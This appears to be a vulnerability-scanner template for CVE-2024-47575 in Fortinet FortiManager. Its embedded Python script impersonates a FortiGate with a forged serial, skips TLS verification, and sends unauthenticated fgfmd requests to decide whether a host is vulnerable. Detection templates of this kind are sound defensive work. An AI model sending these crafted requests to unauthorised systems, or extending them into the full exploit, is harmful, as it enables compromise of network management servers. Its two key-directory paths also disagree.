code:
- engine:
  - py
  - python3
  extractors:
  - dsl:
    - response
    type: dsl
  matchers:
  - type: word
    words:
    - Vulnerable
  source: "import socket\nimport struct\nimport ssl\nimport logging\nimport os\nimport\
    \ sys\n\nlogging.basicConfig(level=logging.INFO, format='%(message)s')\n\nFW_VERSION\
    \ = None\n\ndef create_ssl_context():\n    keys_dir = os.getenv(\"keysDir\", \"\
    helpers/payloads/cve-2024-47575-keys\")\n    cert_path = os.path.join(keys_dir,\
    \ \"w00t_cert.bin\")\n    key_path = os.path.join(keys_dir, \"w00t_key.bin\")\n\
    \n    try:\n        if os.path.isfile(cert_path) and os.path.isfile(key_path):\n\
    \            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n            context.load_cert_chain(certfile=cert_path,\
    \ keyfile=key_path)\n            context.check_hostname = False\n            context.verify_mode\
    \ = ssl.CERT_NONE\n            logging.debug(f\"Loaded certificate from {cert_path}\"\
    )\n            logging.debug(f\"Loaded key from {key_path}\")\n            return\
    \ context\n        else:\n            logging.debug(f\"Certificate or key not\
    \ found: {cert_path}, {key_path}\")\n            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n\
    \            context.check_hostname = False\n            context.verify_mode =\
    \ ssl.CERT_NONE\n            return context\n    except Exception as e:\n    \
    \    logging.debug(f\"Failed to load certificates: {e}\")\n        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n\
    \        context.check_hostname = False\n        context.verify_mode = ssl.CERT_NONE\n\
    \        return context\n\ndef send_message(sock, request):\n    message = struct.pack(\"\
    >II\", 0x36e01100, len(request) + 8) + request\n    sock.send(message)\n    hdr\
    \ = sock.read(8)\n    if len(hdr) != 8:\n        return None\n    magic, size\
    \ = struct.unpack(\">II\", hdr)\n    return sock.read(size - 8)\n\ndef check_vulnerability(target_ip,\
    \ target_port, timeout=10):\n    global FW_VERSION\n\n    auth_request = b\"get\
    \ auth\\r\\nserialno=FGVMEVWG8YMT3R63\\r\\nmgmtid=00000000-0000-0000-0000-000000000000\\\
    r\\nplatform=FortiGate-60E\\r\\nfos_ver=700\\r\\nminor=2\\r\\npatch=4\\r\\nbuild=1396\\\
    r\\nbranch=1396\\r\\nmaxvdom=2\\r\\nfg_ip=192.168.1.53\\r\\nhostname=FortiGate\\\
    r\\nharddisk=yes\\r\\nbiover=04000002\\r\\nharddisk_size=30720\\r\\nlogdisk_size=30107\\\
    r\\nmgmt_mode=normal\\r\\nenc_flags=0\\r\\nmgmtip=192.168.1.53\\r\\nmgmtport=443\\\
    r\\n\\x00\"\n\n    file_exchange_request = b\"get file_exchange\\r\\nlocalid=123\\\
    r\\nchan_window_sz=32768\\r\\ndeflate=gzip\\r\\nfile_exch_cmd=put_json_cmd\\r\\\
    n\\r\\n\\x00\"\n\n    context = create_ssl_context()\n    sock = socket.create_connection((target_ip,\
    \ target_port), timeout=timeout)\n    ssl_sock = context.wrap_socket(sock)\n\n\
    \    response = send_message(ssl_sock, auth_request)\n    if not response:\n \
    \       ssl_sock.close()\n        return False, None\n\n    response = send_message(ssl_sock,\
    \ file_exchange_request)\n    if not response:\n        ssl_sock.close()\n   \
    \     return False, None\n\n    try:\n        response_str = response.decode('utf-8',\
    \ errors='ignore')\n        for line in response_str.split('\\r\\n'):\n      \
    \      if 'remoteid=' in line:\n                remote_id = line.split('=')[1].strip()\n\
    \                if remote_id:\n                    ssl_sock.close()\n       \
    \             return True, FW_VERSION\n    except Exception:\n        pass\n\n\
    \    ssl_sock.close()\n    return False, FW_VERSION\n\ndef main():\n    host =\
    \ os.getenv(\"HOST\")\n    port = os.getenv(\"PORT\")\n\n    target_port = int(port)\
    \ if port else 541\n\n    is_vulnerable, fw_version = check_vulnerability(host,\
    \ target_port)\n\n    if is_vulnerable:\n        if fw_version:\n            print(f\"\
    Vulnerable Version {fw_version}\")\n        else:\n            print(\"Vulnerable\"\
    )\n    else:\n        if fw_version:\n            print(f\"NOT VULN Version {fw_version}\"\
    )\n        else:\n            print(\"NOT VULN\")\n\nif __name__ == \"__main__\"\
    :\n    main()\n"
id: CVE-2024-47575
info:
  author: 0x_Akoko,pussycat0x,watchTowr
  classification:
    cpe: cpe:2.3:a:fortinet:fortimanager:*:*:*:*:*:*:*
    cve-id: CVE-2024-47575
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-306
    epss-percentile: 0.99864
    epss-score: 0.93889
  description: 'A missing authentication vulnerability in Fortinet FortiManager allows
    a remote unauthenticated attacker to execute arbitrary code or commands via specially
    crafted requests to the fgfmd daemon. This vulnerability affects FortiManager
    versions 7.6.0, 7.4.0 through 7.4.4, 7.2.0 through 7.2.7, 7.0.0 through 7.0.12,
    6.4.0 through 6.4.14, 6.2.0 through 6.2.12, and all versions of 6.0.

    '
  impact: 'Unauthenticated attackers can execute arbitrary code or commands through
    specially crafted requests to the fgfmd daemon, achieving complete FortiManager
    server compromise.

    '
  name: FortiManager Unauthenticated Remote Code Execution
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-47575
  - https://github.com/watchtowrlabs/Fortijump-Exploit-CVE-2024-47575
  - https://fortiguard.fortinet.com/psirt/FG-IR-24-423
  remediation: 'Update FortiManager to version 7.6.1 or later, 7.4.5 or later, 7.2.8
    or later, 7.0.13 or later, or 6.4.15 or later.

    '
  severity: critical
  tags: cve,cve2024,fortinet,fortimanager,kev,rce,vkev
variables:
  HOST: '{{Host}}'
  PORT: '{{Port}}'
  keysDir: helpers/payloads/cve-2024-475759-keys
